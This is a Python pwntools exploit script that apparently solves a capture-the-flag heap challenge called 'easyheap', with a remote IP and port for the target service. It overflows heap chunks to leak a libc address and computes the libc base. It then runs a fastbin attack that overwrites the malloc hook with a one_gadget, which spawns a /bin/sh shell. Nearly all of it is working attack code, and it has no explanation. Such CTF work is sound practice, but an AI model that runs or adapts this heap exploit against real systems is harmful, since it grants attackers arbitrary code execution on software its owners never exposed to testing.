from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux',log_level='debug')

sl = lambda x:io.sendline(x)
s = lambda x:io.send(x)
rn = lambda x:io.recv(x)
ru = lambda x:io.recvuntil(x, drop=True)
r = lambda :io.recv()

binary = './easyheap'
ip = '219.219.61.234'
port = 10002

debug = 0
if debug == 0:
    io = process(binary)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    io = remote(ip, port)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(size):
    ru('Command: ')
    sl('1')
    ru('Size: ')
    sl(str(size))

def fill(idx, size, data):
    ru('Command: ')
    sl('2')
    ru('Index: ')
    sl(str(idx))
    ru('Size: ')
    sl(str(size))
    ru('Content: ')
    s(data)

def free(idx):
    ru('Command: ')
    sl('3')
    ru('Index: ')
    sl(str(idx))

def dump(idx):
    ru('Command: ')
    sl('4')
    ru('Index: ')
    sl(str(idx))

add(0x10)
add(0x80)
add(0x10)
add(0x10)
add(0x10)
fill(0, 0x20, 'a'*0x10 + p64(0)+p64(0x21))
free(4)
free(3)
fill(2, 0x21, 'a'*0x10+p64(0)+p64(0x21)+'\x20')
add(0x10)
add(0x10)
fill(0, 0x20, 'a'*0x10 + p64(0)+p64(0x91))
free(1)
dump(4)
ru('Content: \n')
arena = u64(rn(8)) - 88
base = arena - 0x3c4b20
log.success('leak '+hex(arena))
log.success('base '+hex(base))
libc.address = base
sys = libc.sym['system']
one_gadget = base + 0x4526a
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
add(0x10)   #1
add(0x60)   #5
add(0x60)   #6
free(6)
free(5)
fill(1, 0x28, 'a'*0x10+p64(0)+p64(0x71)+p64(arena-0x10-0x23))
add(0x60)
add(0x60)   #6
fill(6, 0x13+8, 'a'*0x13+p64(one_gadget))
#gdb.attach(io)
#raw_input()
add(0x10)
io.interactive()
